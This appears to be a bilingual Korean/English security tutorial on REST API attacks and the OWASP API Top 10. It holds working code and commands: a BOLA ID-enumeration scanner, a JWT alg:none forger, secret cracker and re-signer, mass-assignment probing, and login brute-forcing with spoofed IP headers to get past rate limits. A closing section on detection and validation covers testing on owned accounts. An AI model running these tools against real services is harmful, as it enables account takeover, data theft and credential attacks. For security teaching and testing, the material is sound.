> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# REST API 보안과 OWASP API Top 10

## 0. 초보자를 위한 개념 이해

### REST API란?

**REST API(Representational State Transfer Application Programming Interface)**는 HTTP를 사용해 서버와 클라이언트가 데이터를 주고받는 방식입니다.

```
카카오맵 앱 사용 예시:
  앱 → GET /api/v1/places?q=스타벅스&lat=37.5&lng=127.0
  ← 응답: [{name: "스타벅스 강남점", ...}, ...]
  
  앱이 카카오맵 서버에 REST API로 요청하는 것

REST API의 특징:
  - HTTP 메서드 사용: GET(조회), POST(생성), PUT/PATCH(수정), DELETE(삭제)
  - JSON 형식으로 데이터 교환
  - Stateless: 각 요청이 독립적 (세션 없음)
  - URL로 리소스 표현: /api/users/123, /api/orders/456
```

### API 보안이 중요한 이유

```
앱(모바일/웹) → API → 서버 → DB

API를 통해 모든 것이 이루어집니다:
  - 로그인/로그아웃
  - 데이터 조회/수정/삭제
  - 결제 처리
  - 개인정보 접근

API에 취약점이 있으면:
  - 다른 사람의 데이터에 접근 (BOLA)
  - 관리자 기능 무단 실행
  - 대량 데이터 탈취
  - 서비스 마비 (DoS)
```

### 실제 API 보안 사고

```
2021년 Peloton API 취약점 (BOLA):
  운동기기 회사 Peloton의 사용자 프로필 API
  GET /api/v2/users/{user_id}
  → 인증 없이 다른 사용자 ID로 접근 가능
  → 수백만 명의 나이, 위치, 운동 데이터 노출
  
2020년 Twitter API 취약점:
  전화번호로 계정 조회 가능한 API
  → 공격자가 대량 전화번호로 계정 확인
  → 수백만 계정 전화번호 수집
  
교훈: API 엔드포인트마다 인가 검증 필수
```

---

## 1. OWASP API Security Top 10 (2023)

| # | 취약점 | 설명 |
|---|--------|------|
| API1 | Broken Object Level Authorization | 객체 수준 인가 미흡 — 다른 사용자 리소스 접근 |
| API2 | Broken Authentication | 인증 메커니즘 결함 — 토큰 노출·약한 자격증명 |
| API3 | Broken Object Property Level Authorization | 속성 수준 인가 미흡 — 숨겨진 필드 노출 |
| API4 | Unrestricted Resource Consumption | 속도 제한 없음 — DoS·비용 폭증 유발 |
| API5 | Broken Function Level Authorization | 함수 수준 인가 미흡 — 관리자 엔드포인트 접근 |
| API6 | Unrestricted Access to Sensitive Business Flows | 민감 비즈니스 플로우 무제한 접근 |
| API7 | Server Side Request Forgery | SSRF — 내부 서비스 요청 위조 |
| API8 | Security Misconfiguration | 보안 설정 오류 — 기본 자격증명·불필요한 기능 |
| API9 | Improper Inventory Management | 버전 관리 미흡 — 구형 API 엔드포인트 노출 |
| API10 | Unsafe Consumption of APIs | 외부 API 신뢰 과잉 |

---

## 2. BOLA (Broken Object Level Authorization)

### 2.1 공격 패턴

```bash
# 정상 요청
GET /api/v1/users/1001/profile
Authorization: Bearer <token_user_1001>

# BOLA 공격 — 다른 사용자 ID로 접근
GET /api/v1/users/1002/profile
Authorization: Bearer <token_user_1001>

# 순차 ID 열거
for id in $(seq 1000 1100); do
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/v1/users/$id/profile" | jq .
done
```

### 2.2 BOLA 스캐너

```python
#!/usr/bin/env python3
"""BOLA 취약점 자동 탐지 스캐너."""

import argparse
import asyncio
import json
from dataclasses import dataclass
from typing import Optional

import httpx


@dataclass
class BOLAResult:
    target_id: int | str
    status_code: int
    accessible: bool
    data_snippet: str


async def test_bola(
    client: httpx.AsyncClient,
    base_url: str,
    endpoint_template: str,
    test_id: int | str,
    headers: dict[str, str],
    own_id: int | str,
) -> BOLAResult:
    url = f"{base_url}{endpoint_template.format(id=test_id)}"
    try:
        resp = await client.get(url, headers=headers, timeout=10)
        accessible = resp.status_code == 200 and str(test_id) != str(own_id)
        snippet = resp.text[:200] if resp.status_code == 200 else ""
        return BOLAResult(test_id, resp.status_code, accessible, snippet)
    except httpx.RequestError as e:
        return BOLAResult(test_id, 0, False, str(e))


async def scan_bola(
    base_url: str,
    endpoint_template: str,
    token: str,
    own_id: str,
    id_range: range,
    concurrency: int = 20,
) -> list[BOLAResult]:
    headers = {"Authorization": f"Bearer {token}"}
    semaphore = asyncio.Semaphore(concurrency)
    results: list[BOLAResult] = []

    async def bounded_test(tid: int) -> None:
        async with semaphore:
            r = await test_bola(client, base_url, endpoint_template, tid, headers, own_id)
            if r.accessible:
                print(f"[BOLA] ID {tid} accessible! Status: {r.status_code}")
                print(f"  Snippet: {r.data_snippet[:100]}")
            results.append(r)

    async with httpx.AsyncClient(verify=False) as client:
        await asyncio.gather(*[bounded_test(i) for i in id_range])

    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="BOLA 취약점 스캐너")
    parser.add_argument("url", help="대상 API 베이스 URL")
    parser.add_argument("endpoint", help="엔드포인트 템플릿 (예: /api/v1/users/{id}/profile)")
    parser.add_argument("-t", "--token", required=True, help="인증 토큰")
    parser.add_argument("--own-id", required=True, help="자신의 리소스 ID")
    parser.add_argument("--start", type=int, default=1, help="시작 ID")
    parser.add_argument("--end", type=int, default=100, help="끝 ID")
    parser.add_argument("-c", "--concurrency", type=int, default=20, help="동시 요청 수")
    parser.add_argument("-o", "--output", help="결과 JSON 출력 파일")
    args = parser.parse_args()

    results = asyncio.run(
        scan_bola(
            args.url, args.endpoint, args.token, args.own_id,
            range(args.start, args.end + 1), args.concurrency,
        )
    )

    accessible = [r for r in results if r.accessible]
    print(f"\n총 {len(results)}개 테스트 / BOLA 취약 {len(accessible)}개")

    if args.output:
        with open(args.output, "w") as f:
            json.dump([vars(r) for r in accessible], f, indent=2)
        print(f"결과 저장: {args.output}")


if __name__ == "__main__":
    main()
```

---

## 3. JWT 취약점 분석

### 3.1 일반적인 JWT 공격

```bash
# JWT 구조 디코딩
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.xxx" \
  | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# 알고리즘 none 공격
python3 -c "
import base64, json
header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.b64encode(json.dumps({'sub':'1234','role':'admin'}).encode()).rstrip(b'=').decode()
print(f'{header}.{payload}.')
"

# 약한 시크릿 크래킹 (hashcat)
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

### 3.2 JWT 분석·변조 CLI

```python
#!/usr/bin/env python3
"""JWT 취약점 분석 및 변조 도구."""

import argparse
import base64
import hmac
import json
import hashlib
from pathlib import Path


def b64_decode(s: str) -> bytes:
    padding = 4 - len(s) % 4
    return base64.urlsafe_b64decode(s + "=" * padding)


def b64_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("유효하지 않은 JWT 형식")
    header = json.loads(b64_decode(parts[0]))
    payload = json.loads(b64_decode(parts[1]))
    return header, payload, parts[2]


def forge_none_alg(token: str, new_payload: dict | None = None) -> str:
    header, payload, _ = decode_jwt(token)
    header["alg"] = "none"
    if new_payload:
        payload.update(new_payload)
    h = b64_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def crack_hs256(token: str, wordlist: Path) -> str | None:
    header, payload, sig = decode_jwt(token)
    parts = token.rsplit(".", 1)
    message = parts[0].encode()
    target_sig = b64_decode(sig)
    with wordlist.open() as f:
        for line in f:
            secret = line.strip().encode()
            computed = hmac.new(secret, message, hashlib.sha256).digest()
            if computed == target_sig:
                return line.strip()
    return None


def resign_hs256(token: str, secret: str, new_payload: dict | None = None) -> str:
    header, payload, _ = decode_jwt(token)
    if new_payload:
        payload.update(new_payload)
    h = b64_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    message = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
    return f"{h}.{p}.{b64_encode(sig)}"


def main() -> None:
    parser = argparse.ArgumentParser(description="JWT 취약점 분석 도구")
    sub = parser.add_subparsers(dest="cmd", required=True)

    dec = sub.add_parser("decode", help="JWT 디코딩")
    dec.add_argument("token")

    none_p = sub.add_parser("none", help="alg:none 공격")
    none_p.add_argument("token")
    none_p.add_argument("--payload", help="변경할 페이로드 JSON")

    crack_p = sub.add_parser("crack", help="HS256 시크릿 크래킹")
    crack_p.add_argument("token")
    crack_p.add_argument("wordlist", type=Path)

    resign_p = sub.add_parser("resign", help="HS256 재서명")
    resign_p.add_argument("token")
    resign_p.add_argument("secret")
    resign_p.add_argument("--payload", help="변경할 페이로드 JSON")

    args = parser.parse_args()

    match args.cmd:
        case "decode":
            h, p, _ = decode_jwt(args.token)
            print("Header:", json.dumps(h, indent=2, ensure_ascii=False))
            print("Payload:", json.dumps(p, indent=2, ensure_ascii=False))
        case "none":
            new_p = json.loads(args.payload) if args.payload else None
            print(forge_none_alg(args.token, new_p))
        case "crack":
            secret = crack_hs256(args.token, args.wordlist)
            print(f"시크릿 발견: {secret}" if secret else "시크릿 미발견")
        case "resign":
            new_p = json.loads(args.payload) if args.payload else None
            print(resign_hs256(args.token, args.secret, new_p))


if __name__ == "__main__":
    main()
```

---

## 4. API 정보 수집

### 4.1 Swagger/OpenAPI 발견

```bash
# 일반적인 API 문서 경로
wordlist=(
  "/swagger.json" "/swagger.yaml" "/swagger-ui.html"
  "/api/swagger.json" "/api/docs" "/api/v1/docs"
  "/openapi.json" "/openapi.yaml"
  "/api-docs" "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
  "/redoc" "/graphql" "/graphiql"
)

for path in "${wordlist[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  [ "$code" == "200" ] && echo "[+] $path ($code)"
done
```

### 4.2 HTTP 메서드 열거

```bash
# 허용된 HTTP 메서드 확인
curl -s -X OPTIONS https://api.target.com/v1/users \
  -H "Authorization: Bearer $TOKEN" -I | grep -i allow

# 메서드 퍼징
for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" \
    https://api.target.com/v1/users)
  echo "$method: $code"
done
```

---

## 5. Mass Assignment 공격

```python
#!/usr/bin/env python3
"""Mass Assignment 취약점 탐지."""

import argparse
import json
import httpx


DANGEROUS_FIELDS = [
    "role", "admin", "is_admin", "isAdmin", "privilege",
    "permissions", "group", "verified", "active", "status",
    "balance", "credit", "price", "discount",
]


def test_mass_assignment(
    url: str,
    method: str,
    base_payload: dict,
    token: str,
) -> dict[str, int]:
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    results: dict[str, int] = {}

    for field in DANGEROUS_FIELDS:
        test_payload = {**base_payload, field: True}
        with httpx.Client(verify=False) as client:
            resp = getattr(client, method.lower())(
                url, json=test_payload, headers=headers, timeout=10
            )
            if resp.status_code in (200, 201, 204):
                try:
                    body = resp.json()
                    if field in str(body):
                        print(f"[VULN] Mass Assignment: {field} 필드 반영됨")
                        results[field] = resp.status_code
                except Exception:
                    pass

    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="Mass Assignment 탐지")
    parser.add_argument("url", help="대상 엔드포인트 URL")
    parser.add_argument("-m", "--method", default="POST", choices=["POST", "PUT", "PATCH"])
    parser.add_argument("-p", "--payload", required=True, help="기본 요청 페이로드 JSON")
    parser.add_argument("-t", "--token", required=True)
    args = parser.parse_args()

    base_payload = json.loads(args.payload)
    results = test_mass_assignment(args.url, args.method, base_payload, args.token)
    print(f"\n취약 필드 {len(results)}개 발견: {list(results.keys())}")


if __name__ == "__main__":
    main()
```

---

## 6. API 버전 열거 및 구형 버전 공격

```bash
# API 버전 열거
for ver in v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 beta alpha dev; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://api.target.com/$ver/users")
  [ "$code" != "404" ] && echo "[+] /api/$ver/users: $code"
done

# 구형 API 버전에서 인증 우회 시도
curl -s https://api.target.com/v1/admin/users \
  -H "Authorization: Bearer $OLD_TOKEN"
```

---

## 7. Rate Limiting 우회

```bash
# IP 로테이션으로 Rate Limit 우회
for i in $(seq 1 100); do
  curl -s -X POST https://api.target.com/v1/auth/login \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"password'$i'"}' &
done
wait

# 다양한 헤더로 IP 스푸핑 시도
for header in "X-Forwarded-For" "X-Real-IP" "X-Client-IP" "CF-Connecting-IP"; do
  curl -s -X POST https://api.target.com/v1/auth/login \
    -H "$header: 1.2.3.4" \
    -d '{"username":"admin","password":"test"}'
done
```

---

## 8. 참고 도구

| 도구 | 용도 |
|------|------|
| `ffuf` | API 엔드포인트 퍼징 |
| `arjun` | 숨겨진 파라미터 발견 |
| `kiterunner` | API 경로 자동 발견 |
| `jwt_tool` | JWT 취약점 분석 |
| `Burp Suite` | API 트래픽 인터셉트 |
| `mitmproxy` | API 프록시 분석 |
| `postman` | API 테스트 자동화 |

---

<!-- detect-validate-52 -->
## REST API 공격 탐지와 인가 검증

REST API 공격(OWASP API Top 10)은 *BOLA/IDOR·JWT 취약·Mass Assignment·구버전*으로 데이터·권한을 탈취한다. 방어자는 **객체 레벨 인가가 서버에서 강제되는가**를 검증해야 한다. 검증은 **소유 API/2개 테스트 계정**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 탐지 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| BOLA/IDOR | 객체 인가 누락 | 소유권 검사 | 타 계정 객체 200 |
| JWT 취약 | alg none·약한 키 | 알고 고정·검증 | alg:none 수용 |
| Mass Assignment | 무차별 바인딩 | 허용목록 바인딩 | 권한 필드 주입 성공 |
| 구버전 API | 미패치 v1 | 버전 폐기 | 구버전 200 |

### 방어 검증 (직접 확인)

```bash
# 1) 소유 2계정으로 BOLA 검증 — A 토큰으로 B 객체 요청 시 403/404여야(200이면 인가 갭)
curl -s -o /dev/null -w "B-object via A-token: %{http_code}\n" -H "Authorization: Bearer $TOKEN_A" https://api.internal/v1/users/$USER_B/orders
# 2) JWT alg:none 수용 여부 — 서명 제거 토큰이 거부돼야(수용이면 취약)
h=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'); p=$(printf '{"sub":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'); curl -s -o /dev/null -w "alg:none -> %{http_code}\n" -H "Authorization: Bearer $h.$p." https://api.internal/v1/me
```

> API 방어는 *인가가 서버에서 강제되는가*다 — "응답이 온다"와 "타 계정 객체가 403이고 alg:none이 거부되며 권한 필드가 바인딩되지 않는다"는 다르다. 소유 API/테스트 계정에서 직접 확인한다([[05_Web_Hacking]], [[12_Bug_Bounty]], [[16_Cryptography]]).

**최신 기법·통제 (2025–2026):**
- OWASP API Top 10(BOLA·BFLA·과다노출)이 핵심 — 객체·함수 인가가 서버측에서 강제되는지 재현. 검증: IDOR이 차단되는가([[05_Web_Hacking]])
- 레이트리밋·스키마 검증 — 강제되는지 확인

---

<a name="english"></a>

# REST API Security and OWASP API Top 10

## 1. OWASP API Security Top 10 (2023)

| # | Vulnerability | Description |
|---|---------------|-------------|
| API1 | Broken Object Level Authorization | Insufficient object-level authorization — accessing other users' resources |
| API2 | Broken Authentication | Authentication mechanism flaws — token exposure, weak credentials |
| API3 | Broken Object Property Level Authorization | Insufficient property-level authorization — hidden field exposure |
| API4 | Unrestricted Resource Consumption | No rate limiting — causes DoS and cost spikes |
| API5 | Broken Function Level Authorization | Insufficient function-level authorization — access to admin endpoints |
| API6 | Unrestricted Access to Sensitive Business Flows | Unrestricted access to sensitive business flows |
| API7 | Server Side Request Forgery | SSRF — forging requests to internal services |
| API8 | Security Misconfiguration | Security configuration errors — default credentials, unnecessary features |
| API9 | Improper Inventory Management | Insufficient version management — exposure of legacy API endpoints |
| API10 | Unsafe Consumption of APIs | Excessive trust in external APIs |

---

## 2. BOLA (Broken Object Level Authorization)

### 2.1 Attack Patterns

```bash
# Normal request
GET /api/v1/users/1001/profile
Authorization: Bearer <token_user_1001>

# BOLA attack — accessing with another user's ID
GET /api/v1/users/1002/profile
Authorization: Bearer <token_user_1001>

# Sequential ID enumeration
for id in $(seq 1000 1100); do
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://api.target.com/v1/users/$id/profile" | jq .
done
```

### 2.2 BOLA Scanner

```python
#!/usr/bin/env python3
"""Automated BOLA vulnerability detection scanner."""

import argparse
import asyncio
import json
from dataclasses import dataclass
from typing import Optional

import httpx


@dataclass
class BOLAResult:
    target_id: int | str
    status_code: int
    accessible: bool
    data_snippet: str


async def test_bola(
    client: httpx.AsyncClient,
    base_url: str,
    endpoint_template: str,
    test_id: int | str,
    headers: dict[str, str],
    own_id: int | str,
) -> BOLAResult:
    url = f"{base_url}{endpoint_template.format(id=test_id)}"
    try:
        resp = await client.get(url, headers=headers, timeout=10)
        accessible = resp.status_code == 200 and str(test_id) != str(own_id)
        snippet = resp.text[:200] if resp.status_code == 200 else ""
        return BOLAResult(test_id, resp.status_code, accessible, snippet)
    except httpx.RequestError as e:
        return BOLAResult(test_id, 0, False, str(e))


async def scan_bola(
    base_url: str,
    endpoint_template: str,
    token: str,
    own_id: str,
    id_range: range,
    concurrency: int = 20,
) -> list[BOLAResult]:
    headers = {"Authorization": f"Bearer {token}"}
    semaphore = asyncio.Semaphore(concurrency)
    results: list[BOLAResult] = []

    async def bounded_test(tid: int) -> None:
        async with semaphore:
            r = await test_bola(client, base_url, endpoint_template, tid, headers, own_id)
            if r.accessible:
                print(f"[BOLA] ID {tid} accessible! Status: {r.status_code}")
                print(f"  Snippet: {r.data_snippet[:100]}")
            results.append(r)

    async with httpx.AsyncClient(verify=False) as client:
        await asyncio.gather(*[bounded_test(i) for i in id_range])

    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="BOLA vulnerability scanner")
    parser.add_argument("url", help="Target API base URL")
    parser.add_argument("endpoint", help="Endpoint template (e.g., /api/v1/users/{id}/profile)")
    parser.add_argument("-t", "--token", required=True, help="Authentication token")
    parser.add_argument("--own-id", required=True, help="Your own resource ID")
    parser.add_argument("--start", type=int, default=1, help="Start ID")
    parser.add_argument("--end", type=int, default=100, help="End ID")
    parser.add_argument("-c", "--concurrency", type=int, default=20, help="Concurrent requests")
    parser.add_argument("-o", "--output", help="Output JSON file")
    args = parser.parse_args()

    results = asyncio.run(
        scan_bola(
            args.url, args.endpoint, args.token, args.own_id,
            range(args.start, args.end + 1), args.concurrency,
        )
    )

    accessible = [r for r in results if r.accessible]
    print(f"\nTotal {len(results)} tested / {len(accessible)} BOLA vulnerable")

    if args.output:
        with open(args.output, "w") as f:
            json.dump([vars(r) for r in accessible], f, indent=2)
        print(f"Results saved: {args.output}")


if __name__ == "__main__":
    main()
```

---

## 3. JWT Vulnerability Analysis

### 3.1 Common JWT Attacks

```bash
# Decode JWT structure
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.xxx" \
  | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Algorithm none attack
python3 -c "
import base64, json
header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.b64encode(json.dumps({'sub':'1234','role':'admin'}).encode()).rstrip(b'=').decode()
print(f'{header}.{payload}.')
"

# Weak secret cracking (hashcat)
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

### 3.2 JWT Analysis and Tampering CLI

```python
#!/usr/bin/env python3
"""JWT vulnerability analysis and tampering tool."""

import argparse
import base64
import hmac
import json
import hashlib
from pathlib import Path


def b64_decode(s: str) -> bytes:
    padding = 4 - len(s) % 4
    return base64.urlsafe_b64decode(s + "=" * padding)


def b64_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")
    header = json.loads(b64_decode(parts[0]))
    payload = json.loads(b64_decode(parts[1]))
    return header, payload, parts[2]


def forge_none_alg(token: str, new_payload: dict | None = None) -> str:
    header, payload, _ = decode_jwt(token)
    header["alg"] = "none"
    if new_payload:
        payload.update(new_payload)
    h = b64_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def crack_hs256(token: str, wordlist: Path) -> str | None:
    header, payload, sig = decode_jwt(token)
    parts = token.rsplit(".", 1)
    message = parts[0].encode()
    target_sig = b64_decode(sig)
    with wordlist.open() as f:
        for line in f:
            secret = line.strip().encode()
            computed = hmac.new(secret, message, hashlib.sha256).digest()
            if computed == target_sig:
                return line.strip()
    return None


def resign_hs256(token: str, secret: str, new_payload: dict | None = None) -> str:
    header, payload, _ = decode_jwt(token)
    if new_payload:
        payload.update(new_payload)
    h = b64_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    message = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
    return f"{h}.{p}.{b64_encode(sig)}"


def main() -> None:
    parser = argparse.ArgumentParser(description="JWT vulnerability analysis tool")
    sub = parser.add_subparsers(dest="cmd", required=True)

    dec = sub.add_parser("decode", help="Decode JWT")
    dec.add_argument("token")

    none_p = sub.add_parser("none", help="alg:none attack")
    none_p.add_argument("token")
    none_p.add_argument("--payload", help="Payload JSON to modify")

    crack_p = sub.add_parser("crack", help="HS256 secret cracking")
    crack_p.add_argument("token")
    crack_p.add_argument("wordlist", type=Path)

    resign_p = sub.add_parser("resign", help="HS256 re-signing")
    resign_p.add_argument("token")
    resign_p.add_argument("secret")
    resign_p.add_argument("--payload", help="Payload JSON to modify")

    args = parser.parse_args()

    match args.cmd:
        case "decode":
            h, p, _ = decode_jwt(args.token)
            print("Header:", json.dumps(h, indent=2, ensure_ascii=False))
            print("Payload:", json.dumps(p, indent=2, ensure_ascii=False))
        case "none":
            new_p = json.loads(args.payload) if args.payload else None
            print(forge_none_alg(args.token, new_p))
        case "crack":
            secret = crack_hs256(args.token, args.wordlist)
            print(f"Secret found: {secret}" if secret else "Secret not found")
        case "resign":
            new_p = json.loads(args.payload) if args.payload else None
            print(resign_hs256(args.token, args.secret, new_p))


if __name__ == "__main__":
    main()
```

---

## 4. API Information Gathering

### 4.1 Swagger/OpenAPI Discovery

```bash
# Common API documentation paths
wordlist=(
  "/swagger.json" "/swagger.yaml" "/swagger-ui.html"
  "/api/swagger.json" "/api/docs" "/api/v1/docs"
  "/openapi.json" "/openapi.yaml"
  "/api-docs" "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
  "/redoc" "/graphql" "/graphiql"
)

for path in "${wordlist[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  [ "$code" == "200" ] && echo "[+] $path ($code)"
done
```

### 4.2 HTTP Method Enumeration

```bash
# Check allowed HTTP methods
curl -s -X OPTIONS https://api.target.com/v1/users \
  -H "Authorization: Bearer $TOKEN" -I | grep -i allow

# Method fuzzing
for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" \
    https://api.target.com/v1/users)
  echo "$method: $code"
done
```

---

## 5. Mass Assignment Attack

```python
#!/usr/bin/env python3
"""Mass Assignment vulnerability detection."""

import argparse
import json
import httpx


DANGEROUS_FIELDS = [
    "role", "admin", "is_admin", "isAdmin", "privilege",
    "permissions", "group", "verified", "active", "status",
    "balance", "credit", "price", "discount",
]


def test_mass_assignment(
    url: str,
    method: str,
    base_payload: dict,
    token: str,
) -> dict[str, int]:
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    results: dict[str, int] = {}

    for field in DANGEROUS_FIELDS:
        test_payload = {**base_payload, field: True}
        with httpx.Client(verify=False) as client:
            resp = getattr(client, method.lower())(
                url, json=test_payload, headers=headers, timeout=10
            )
            if resp.status_code in (200, 201, 204):
                try:
                    body = resp.json()
                    if field in str(body):
                        print(f"[VULN] Mass Assignment: field '{field}' was reflected")
                        results[field] = resp.status_code
                except Exception:
                    pass

    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="Mass Assignment detection")
    parser.add_argument("url", help="Target endpoint URL")
    parser.add_argument("-m", "--method", default="POST", choices=["POST", "PUT", "PATCH"])
    parser.add_argument("-p", "--payload", required=True, help="Base request payload JSON")
    parser.add_argument("-t", "--token", required=True)
    args = parser.parse_args()

    base_payload = json.loads(args.payload)
    results = test_mass_assignment(args.url, args.method, base_payload, args.token)
    print(f"\n{len(results)} vulnerable fields found: {list(results.keys())}")


if __name__ == "__main__":
    main()
```

---

## 6. API Version Enumeration and Legacy Version Attacks

```bash
# API version enumeration
for ver in v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 beta alpha dev; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://api.target.com/$ver/users")
  [ "$code" != "404" ] && echo "[+] /api/$ver/users: $code"
done

# Attempt authentication bypass on legacy API version
curl -s https://api.target.com/v1/admin/users \
  -H "Authorization: Bearer $OLD_TOKEN"
```

---

## 7. Rate Limiting Bypass

```bash
# Bypass rate limit via IP rotation
for i in $(seq 1 100); do
  curl -s -X POST https://api.target.com/v1/auth/login \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"password'$i'"}' &
done
wait

# Attempt IP spoofing with various headers
for header in "X-Forwarded-For" "X-Real-IP" "X-Client-IP" "CF-Connecting-IP"; do
  curl -s -X POST https://api.target.com/v1/auth/login \
    -H "$header: 1.2.3.4" \
    -d '{"username":"admin","password":"test"}'
done
```

---

## 8. Reference Tools

| Tool | Purpose |
|------|---------|
| `ffuf` | API endpoint fuzzing |
| `arjun` | Hidden parameter discovery |
| `kiterunner` | Automated API path discovery |
| `jwt_tool` | JWT vulnerability analysis |
| `Burp Suite` | API traffic interception |
| `mitmproxy` | API proxy analysis |
| `postman` | API test automation |

<!-- detect-validate-52 -->
## REST API Attack Detection and Authorization Validation

REST API attacks (OWASP API Top 10) steal data/authority via *BOLA/IDOR, JWT flaws, Mass Assignment, and old versions*. Defenders must verify **whether object-level authorization is enforced server-side**. Validate only on **owned APIs/two test accounts**.

### Attack -> Targeted weakness -> Primary control (defender) -> Detection signal

| Technique | Targeted weakness | Primary control (defender) | Detection signal |
|---|---|---|---|
| BOLA/IDOR | Missing object authz | Ownership check | 200 on another account's object |
| JWT flaw | alg none, weak key | Pin algo, verify | alg:none accepted |
| Mass Assignment | Indiscriminate binding | Allowlist binding | Privilege-field injection works |
| Old API version | Unpatched v1 | Deprecate versions | Old version 200 |

### Defense validation (verify directly)

```bash
# 1) BOLA check with two owned accounts — requesting B's object with A's token should be 403/404 (200 = authz gap)
curl -s -o /dev/null -w "B-object via A-token: %{http_code}\n" -H "Authorization: Bearer $TOKEN_A" https://api.internal/v1/users/$USER_B/orders
# 2) Whether JWT alg:none is accepted — a signature-stripped token should be rejected (acceptance = vulnerable)
h=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'); p=$(printf '{"sub":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'); curl -s -o /dev/null -w "alg:none -> %{http_code}\n" -H "Authorization: Bearer $h.$p." https://api.internal/v1/me
```

> API defense is *whether authorization is enforced server-side* -- "a response comes back" differs from "another account's object is 403, alg:none is rejected, and privilege fields are not bound". Confirm on owned APIs/test accounts directly ([[05_Web_Hacking]], [[12_Bug_Bounty]], [[16_Cryptography]]).
